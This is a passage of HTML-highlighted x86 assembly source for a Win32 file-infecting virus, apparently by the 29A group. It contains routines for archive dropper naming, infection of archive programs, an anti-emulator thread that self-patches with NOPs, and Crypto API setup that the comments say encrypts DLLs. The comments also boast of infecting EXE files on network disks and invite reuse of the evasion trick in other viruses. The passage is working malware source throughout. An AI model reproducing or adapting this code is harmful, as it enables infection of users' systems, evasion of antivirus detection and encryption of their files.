        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;LastWriteTime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;LastAccessTime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;CreationTime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetFileTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sai_failed</span><span class="sc0">

    </span><span class="sc5">__sai_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function generates FileName to archive.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:</span><span class="sc0">
        </span><span class="sc1">;        EDI ... where put new name (maximum=8+1+3)</span><span class="sc0">
        </span><span class="sc1">;  output:</span><span class="sc0">
        </span><span class="sc1">;        EAX ... filename length</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">generate_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gen_archive_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">gen_archive_number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">name_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">name_found</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">name_search</span><span class="sc0">
    </span><span class="sc5">name_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_spec_char</span><span class="sc0">
    </span><span class="sc5">no_gen_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_spec_char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">gen_spec_char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">char_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">char_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'!'</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">char_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function copy source place to  destination. So  that</span><span class="sc0">
        </span><span class="sc1">;it is MOVSD instruction with STD flag.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:</span><span class="sc0">
        </span><span class="sc1">;        ESI ... source place in memory</span><span class="sc0">
        </span><span class="sc1">;        EDI ... destination place in memory</span><span class="sc0">
        </span><span class="sc1">;        ECX ... number bytes to move</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Note: ESI, EDI ain't real addresses- to understand see on</span><span class="sc0">
        </span><span class="sc1">;      the first four instructions.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__movsd_back</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;This code has been stolen</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;from CiA 1.50 sources.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;(c)oded by Dement</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">;dement@email.cz</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__mb_nomovsb</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc5">__mb_nomovsb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mb_finish</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__mb_nomovsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mb_finish</span><span class="sc0">
    </span><span class="sc5">__mb_nomovsw</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">           </span><span class="sc1">;copy me - I wanna travel</span><span class="sc0">
    </span><span class="sc5">__mb_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to actualize compressed programs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function was called itself from  Hyper Infection and</span><span class="sc0">
        </span><span class="sc1">;it means the extension has been found.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    EDX ... file name</span><span class="sc0">
        </span><span class="sc1">;        EAX ... input parameter (pointer into table)</span><span class="sc0">
        </span><span class="sc1">;        EBX ... next filename in HyperTable</span><span class="sc0">
</span><span class="sc5">archive_act</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; for more information about EAX (tables), find "AProgram"</span><span class="sc0">
        </span><span class="sc1">; structure</span><span class="sc0">

        </span><span class="sc1">; save registers &amp; load EAX parameter</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc1">; calculate filename length and allocate memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;filename length</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.program</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save destination place</span><span class="sc0">

        </span><span class="sc1">; copy filename there</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;filename length</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; disable this archive program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc5">HyperTable_HalfSize</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc1">; restore registers</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ threads ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Anti-emulators:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Welcome everybody who wanna use this method in your viruses. At first</span><span class="sc0">
</span><span class="sc1">;   I hope you know whats "thread" and "fiber" (see Benny's tutorial). So</span><span class="sc0">
</span><span class="sc1">;   you active "__thread_1" which it'll patch your original code on NOPs,</span><span class="sc0">
</span><span class="sc1">;   and after that, who will write that original code there ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       __thread_1_begin:</span><span class="sc0">
</span><span class="sc1">;           jmp $          ;instead this will be NOPs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   And by "@ANTI_E_START" macro  you  will PUSH that original values and</span><span class="sc0">
</span><span class="sc1">;   then by "@ANTI_E_FINISH" you will restore  those values. Try to debug</span><span class="sc0">
</span><span class="sc1">;   this source and you'll understand it or send me mail.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This thread rewrite some bytes. Common anti-emulator.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  (__MyCreateThread)</span><span class="sc0">
        </span><span class="sc1">;  input:</span><span class="sc0">
        </span><span class="sc1">;    EAX ... address of this function (__thread_1)</span><span class="sc0">
        </span><span class="sc1">;    EBX ... information</span><span class="sc0">
        </span><span class="sc1">;          * upper imm8 reg ... bytes to patch</span><span class="sc0">
        </span><span class="sc1">;          * where from here (offset)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__thread_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get thread parameter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">         </span><span class="sc1">;get last imm8 reg</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00FFFFFFh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc5">__thread_1_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">  </span><span class="sc1">;patch it</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;next byte to patch :)</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__thread_1_loop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to Win32 Cryptography APIs startup ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;At last, at last I start to code this function, at last !</span><span class="sc0">
        </span><span class="sc1">;So, at first I must  check if "Prizzy/29A" key exists. If</span><span class="sc0">
        </span><span class="sc1">;not, I must create it. Also I'll check whether Crypto API</span><span class="sc0">
        </span><span class="sc1">;functions exists in "ADVAPI32.DLL" file because  they are</span><span class="sc0">
        </span><span class="sc1">;from "Windows 95, OEM Service Release 2" and WinNT, sure!</span><span class="sc0">
        </span><span class="sc1">;I cant also decrypt DLL  files on network's disks because</span><span class="sc0">
        </span><span class="sc1">;I must store CSP  cryptography key in  register class and</span><span class="sc0">
        </span><span class="sc1">;on those disks I couldn't load that CSP public/simple key</span><span class="sc0">
        </span><span class="sc1">;from that register. But it  does not matter because I can</span><span class="sc0">
        </span><span class="sc1">;infect EXE files on network's disks. Hehehe - Im perfect!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypto_startup</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Action</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_loadKey</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; check if cryptography functions has been found...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptAcquireContextA</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cs_fault</span><span class="sc0">

        </span><span class="sc1">; get if crypto key exists in registers...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;Flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;PROV_RSA_FULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;provider name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_KeyName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;my special key</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;CSP provider</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptAcquireContextA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;does key exist ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cs_continue</span><span class="sc0">

        </span><span class="sc1">; create new key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">;CRYPT_NEWKEYSET</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;PROV_RSA_FULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;provider name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_KeyName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;my special key</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;CSP provider</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptAcquireContextA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cs_fault</span><span class="sc0">

        </span><span class="sc1">; register folder "Prizzy/29A" has been created or opened</span><span class="sc0">
        </span><span class="sc1">; now, check whether I have to generate CPS key</span><span class="sc0">
    </span><span class="sc5">__cs_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__cs_created_key</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cs_fault</span><span class="sc0">

        </span><span class="sc1">; generate CSP key for my... for my... for my purpose {:-)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;key's value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;CRYPT_EXPORTABLE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;AT_KEYEXCHANGE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptGenKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;generate key</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cs_fault</span><span class="sc0">

        </span><span class="sc1">; get handle to the key exchange</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_XchgKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;AT_KEYEXCHANGE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptGetUserKey</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; get a random block cipher session key</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;CRYPT_EXPORTABLE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00006602h</span><span class="sc0">       </span><span class="sc1">;CALG_RC2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptGenKey</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; determine size of key blob and allocate memory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobLen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;SIMPLEBLOB</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_XchgKey</span><span class="sc4">]</span><span class="sc0">
